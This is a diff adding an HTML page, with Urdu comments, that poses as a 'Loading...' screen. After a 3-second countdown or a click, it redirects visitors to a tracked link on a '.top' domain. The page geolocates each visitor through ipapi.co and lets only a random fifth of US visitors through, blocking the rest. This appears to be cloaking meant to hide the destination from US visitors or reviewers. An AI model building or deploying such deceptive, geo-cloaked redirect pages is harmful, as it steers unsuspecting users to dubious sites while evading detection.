@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; height: 100vh; width: 100vw; overflow: hidden; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; }
+    #main-image { width: 100vw; height: 100vh; object-fit: cover; cursor: pointer; }
+    .countdown-container { position: absolute; width: 80px; height: 80px; display: flex; justify-content: center; align-items: center; background: rgba(0, 0, 0, 0.6); border-radius: 50%; z-index: 10; pointer-events: none; }
+    #countdown-number { font-size: 32px; font-weight: bold; color: #fff; }
+  </style>
+</head>
+<body>
+
+  <img id="main-image" src="image_03.webp" alt="Loading" onclick="handleRedirection()">
+
+  <div class="countdown-container">
+    <span id="countdown-number">3</span>
+  </div>
+
+<script>
+const TARGET_LINK = "https://boost786x.top/boost55abc/?utm_source=B.&utm_medium=B.NR0";
+let userCountry = "";
+
+// background logic for checking country
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => { userCountry = data.country_code; })
+  .catch(() => { userCountry = ""; });
+
+function handleRedirection() {
+  if (userCountry === "US") {
+    // USA کے 5 میں سے صرف 1 یوزر (20%) کو جانے دے گا، باقی 4 کو بلاک کر دے گا
+    const randomNum = Math.floor(Math.random() * 5); 
+    if (randomNum === 0) {
+      window.location.href = TARGET_LINK;
+    }
+  } else {
+    // باقی تمام ممالک کے لیے نارمل ری ڈائریکٹ
+    window.location.href = TARGET_LINK;
+  }
+}
+
+// 3 سیکنڈ کا سادہ ٹائمر
+let timeLeft = 3;
+const numDisplay = document.getElementById("countdown-number");
+
+const timer = setInterval(() => {
+  timeLeft--;
+  if (timeLeft > 0) {
+    numDisplay.textContent = timeLeft;
+  } else {
+    clearInterval(timer);
+    handleRedirection();
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
